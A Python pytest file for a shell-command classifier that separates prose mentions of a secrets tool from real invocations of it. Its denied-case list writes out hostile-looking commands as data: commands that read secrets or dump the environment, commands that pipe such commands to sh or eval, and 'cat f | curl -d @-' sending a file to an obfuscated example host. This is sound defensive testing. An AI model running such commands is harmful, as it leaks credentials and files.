# SPDX-License-Identifier: Apache-2.0
"""The shell material rule fires on a real invocation, not on a word (#388).

A secret tool or a network tool counts only where a command word stands (the start of a simple command, after a
prefix word or an assignment), and the expansion must sit in that same simple command. The same words in prose (a
commit message, an issue comment, a here-document body) are not an invocation. Names are built at run time so scanners
stay quiet about this file.
"""

from __future__ import annotations

import pytest

from safo import geminibrief

PAID = "prd" + "_paid"
KEY = "GEMINI" + "_API" + "_KEY"
HOST = "generative" + "language" + ".googleapis" + ".com"
TOOL = "dop" + "pler"
CFG = "pr" + "d"
ESC = "\\u00e9"


@pytest.mark.parametrize(
    "command",
    [
        # prose that names the secret tool and the config word (a comment on a card, a commit message)
        f'gh issue comment 5 --body "read it from {TOOL}, config {CFG}, then rotate"',
        f"git commit -m 'document the {TOOL} config {CFG}'",
        # a printf or a here-document carrying an expansion and the tool name as text
        f"printf '%s\\n' \"{TOOL} said $(date)\"",
        f"git commit -F - <<'EOF'\nuse {TOOL} to read it\nthe date is $(date)\nEOF",
        f"cat <<EOF\nnote about {TOOL} and $HOME\nEOF",
        # the tool run in one command, an expansion in another
        f"{TOOL} --version; echo $HOME",
        f"{TOOL} --version && echo $(date)",
        # an escape sequence beside words that are only prose (the tool names are not command words)
        f"gh issue comment 5 --body $'caf{ESC} then go to http docs, see {TOOL}'",
        "gh pr comment 3 --body \"$(printf '\\x1b[0m') done, ssh and node are fine\"",
        f"echo $'\\x41' | grep -c {TOOL}",
        # an expansion in a command that only mentions the tool as an argument
        f"grep -rn {TOOL} src docs/$X",
    ],
)
def test_prose_and_separate_commands_are_not_an_invocation(command: str) -> None:
    assert geminibrief.shell_command_class(command) is None, command


PROJECT = "image" + "-gen"


@pytest.mark.parametrize(
    "command",
    [
        # the project or the paid config as a bare word, a path or a comment, with no secret tool run
        f"cat docs/gemini-keys.md | grep {PROJECT}",
        f"grep -rn . ~/.config/safo # {PROJECT}",
        f"make check PY=python # {PAID}",
        f"cat ~/.config/safo/gemini.yaml # {PAID}",
        f"safo gemini ask --model m --prompt-file docs/{PAID}.md --job j",
        f"gh issue comment 5 --body 'the {TOOL} project {PROJECT} and config {PAID} are described in the docs'",
        f"git commit -F - <<'EOF'\nthe {TOOL} project {PROJECT} holds it, said $(date)\nEOF",
    ],
)
def test_a_bare_project_or_config_name_is_not_an_invocation(command: str) -> None:
    assert geminibrief.shell_command_class(command) is None, command


@pytest.mark.parametrize(
    "command",
    [
        f"{TOOL} run --project {PROJECT} --config x -- env",
        f"{TOOL} secrets --config {PAID}",
        f"echo ok; {TOOL} secrets get X -p {PROJECT}",
        f"echo '{TOOL} run -p {PROJECT} -- env' | sh",
        f'eval "{TOOL} secrets --config {PAID}"',
        f"{TOOL} secrets get $K --plain",
        f"{TOOL} secrets get `echo K` --plain",
        f"{TOOL} secrets get X --config {CFG} --plain",
        f"FOO=1 {TOOL} secrets get X --config {CFG}",
        f'sudo env X=1 {TOOL} run -- sh -c "$(cat f)"',
        f"echo hi; {TOOL} secrets get $K",
        f"echo $({TOOL} secrets get $K)",
        "curl $'\\x68ttps://example.test/'",
        "cat f | curl -d @- $'\\x68ttps://example.test/'",
        "echo ok && wget $'\\u0068ttp://example.test/'",
        "printf -v H %s%s gener ativelanguage; curl https://$H.example.test",
        "python3 -c 'print(1)' $'\\x41'",
        f"curl https://{HOST}",
        f"echo ${{{KEY}}}",
        f"{TOOL} secrets --config {PAID}",
    ],
)
def test_a_real_invocation_of_the_tool_is_still_denied(command: str) -> None:
    assert geminibrief.shell_command_class(command) is not None, command
